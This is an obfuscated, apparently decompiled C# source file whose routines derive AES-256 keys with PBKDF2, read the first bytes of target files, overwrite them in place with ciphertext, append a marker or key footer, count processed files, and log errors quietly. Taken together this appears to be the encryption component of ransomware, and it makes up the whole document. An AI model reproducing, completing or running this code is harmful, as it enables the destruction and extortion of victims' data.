using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

public static class kkKbYndBNVRIq
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] ZhgCAqtDUPafD(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = FBBGGsABJYu(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes FBBGGsABJYu(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] IVisBGGKLwj(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (YpCGOwjDWwATs.jdWvevqcLSOo == getString_0(107396935))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (YpCGOwjDWwATs.IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(YpCGOwjDWwATs.kZGwVMpcMFQGdu, getString_0(107349274) + string_0 + getString_0(107461684) + ex.Message + getString_0(107396707));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool cOUmRprntfS(string mMkGcFwOyALFJP, byte[] fWbWouVUtQb, byte[] wNHkPJFScGyAC = null)
	{
		try
		{
			byte[] array = null;
			if (YpCGOwjDWwATs.jdWvevqcLSOo == getString_0(107396935))
			{
				array = (YpCGOwjDWwATs.JsBIHINLdKrOq ? Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626))) : Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(mMkGcFwOyALFJP, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(fWbWouVUtQb, 0, fWbWouVUtQb.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(mMkGcFwOyALFJP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!YpCGOwjDWwATs.JsBIHINLdKrOq)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(wNHkPJFScGyAC, 0, wNHkPJFScGyAC.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (YpCGOwjDWwATs.JsBIHINLdKrOq ? Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626))) : Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603))));
				FileStream fileStream2 = new FileStream(mMkGcFwOyALFJP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(fWbWouVUtQb, 0, fWbWouVUtQb.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(mMkGcFwOyALFJP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!YpCGOwjDWwATs.JsBIHINLdKrOq)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(wNHkPJFScGyAC, 0, wNHkPJFScGyAC.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			YpCGOwjDWwATs.iRDeCsZxbW++;
		}
		catch (Exception ex)
		{
			if (YpCGOwjDWwATs.IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(YpCGOwjDWwATs.kZGwVMpcMFQGdu, getString_0(107349274) + mMkGcFwOyALFJP + getString_0(107461585) + ex.Message + getString_0(107396707));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (YpCGOwjDWwATs.JsBIHINLdKrOq ? Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461626))) : Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(YpCGOwjDWwATs.DouUqolyZMEp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603)) + Convert.ToString(YpCGOwjDWwATs.XaBojWlRQDbFIzp) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461603))));
				FileStream fileStream4 = new FileStream(mMkGcFwOyALFJP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(fWbWouVUtQb, 0, fWbWouVUtQb.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(mMkGcFwOyALFJP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!YpCGOwjDWwATs.JsBIHINLdKrOq)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(wNHkPJFScGyAC, 0, wNHkPJFScGyAC.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static kkKbYndBNVRIq()
	{
		Strings.CreateGetStringDelegate(typeof(kkKbYndBNVRIq));
	}
}
